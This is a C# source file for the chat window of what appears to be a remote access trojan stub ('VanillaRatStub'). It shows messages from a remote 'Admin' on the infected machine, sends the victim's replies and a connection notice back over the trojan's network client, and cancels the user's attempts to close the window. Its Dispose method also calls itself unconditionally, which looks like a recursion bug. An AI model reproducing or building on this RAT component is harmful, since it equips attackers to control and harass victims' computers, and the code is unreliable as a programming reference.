using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using VanillaRatStub.InformationHelpers;

namespace VanillaRatStub.Forms
{
    public class ChatInterface : Form
    {
        private string OldMessage;
        private string NewMessage;
        private TextBox txtSend;
        private Button btnSend;
        private RichTextBox txtChat;
        private Panel panel1;
        public Timer GetMessageLoop;
        private System.ComponentModel.IContainer Components = null;

        //Initialize chat form
        public ChatInterface()
        {
            txtSend = new TextBox();
            btnSend = new Button();
            panel1 = new Panel();
            txtChat = new RichTextBox();
            GetMessageLoop = new Timer();
            SuspendLayout();

            GetMessageLoop.Interval = 100;
            GetMessageLoop.Tick += GetNextMessage;

            txtChat.ReadOnly = true;
            txtChat.BorderStyle = BorderStyle.None;
            txtChat.Location = new Point(-1, -1);
            txtChat.Name = "txtChat";
            txtChat.Size = new Size(620, 316);
            txtChat.TabIndex = 0;
            txtChat.Text = "";

            panel1.BorderStyle = BorderStyle.FixedSingle;
            panel1.Controls.Add(txtChat);
            panel1.Location = new Point(12, 12);
            panel1.Name = "panel1";
            panel1.Size = new Size(620, 316);
            panel1.TabIndex = 6;

            txtSend.Location = new Point(12, 336);
            txtSend.Name = "txtSend";
            txtSend.Size = new Size(539, 20);
            txtSend.TabIndex = 0;
            txtSend.KeyDown += SendMessageByKey;

            btnSend.Location = new Point(557, 334);
            btnSend.Name = "btnSend";
            btnSend.Size = new Size(75, 23);
            btnSend.TabIndex = 1;
            btnSend.Text = "Send";
            btnSend.UseVisualStyleBackColor = true;
            btnSend.Click += btnSend_Click;

            AutoScaleDimensions = new SizeF(6F, 13F);
            AutoScaleMode = AutoScaleMode.Font;
            ClientSize = new Size(644, 368);
            Controls.Add(btnSend);
            Controls.Add(txtSend);
            Controls.Add(panel1);
            FormBorderStyle = FormBorderStyle.FixedSingle;
            MaximizeBox = false;
            MinimizeBox = false;
            Name = "Chat";
            Text = "Chat";
            FormClosing += Chat_FormClosing;
            Load += Chat_FormLoading;            
            ResumeLayout(false);
            PerformLayout();
        }
        
        //Get next message from server on timer tick
        private void GetNextMessage(object sender, EventArgs e)
        {
            if (Networking.ChatClosing)
            {
                Networking.ChatClosing = false;
                GetMessageLoop.Stop();
                return;
            }
            NewMessage = Networking.CurrentMessage;
            if (NewMessage != OldMessage)
            {
                if (string.IsNullOrWhiteSpace(txtChat.Text))
                {
                    txtChat.Text = "Admin: " + NewMessage;
                }
                else
                {
                    txtChat.AppendText(Environment.NewLine + "Admin: " + NewMessage);
                }
                OldMessage = NewMessage;
            }
        }

        //Start GetMessageLoop on form load
        private void Chat_FormLoading(object sender, EventArgs e)
        {
            GetMessageLoop.Start();
            CheckForIllegalCrossThreadCalls = false;
            List<byte> ToSend = new List<byte>();
            ToSend.Add(16); //Message Type 
            ToSend.AddRange(Encoding.ASCII.GetBytes("Connected to chat"));
            Networking.MainClient.Send(ToSend.ToArray());
        }

        //Cancel form close
        private void Chat_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing)
                e.Cancel = true;
        }

        //Dispose form
        protected override void Dispose(bool Disposing)
        {
            if (Disposing && (Components != null))
            {
                Components.Dispose();
            }
            Dispose();
        }      

        //Send message by button 
        private void btnSend_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtChat.Text))
            {
                txtChat.Text = "You: " + txtSend.Text;
            }
            else
            {
                txtChat.AppendText(Environment.NewLine + "You: " + txtSend.Text);
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add(16); //Message Type 
            ToSend.AddRange(Encoding.ASCII.GetBytes(txtSend.Text));
            Networking.MainClient.Send(ToSend.ToArray());
            txtSend.Text = "";          
        }

        //Send message by enter key
        private void SendMessageByKey(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                if (string.IsNullOrWhiteSpace(txtChat.Text))
                {
                    txtChat.Text = "You: " + txtSend.Text;
                }
                else
                {
                    txtChat.AppendText(Environment.NewLine + "You: " + txtSend.Text);
                }
                List<byte> ToSend = new List<byte>();
                ToSend.Add(16); //Message Type 
                ToSend.AddRange(Encoding.ASCII.GetBytes(txtSend.Text));
                Networking.MainClient.Send(ToSend.ToArray());
                txtSend.Text = "";
            }
        }
    }
}
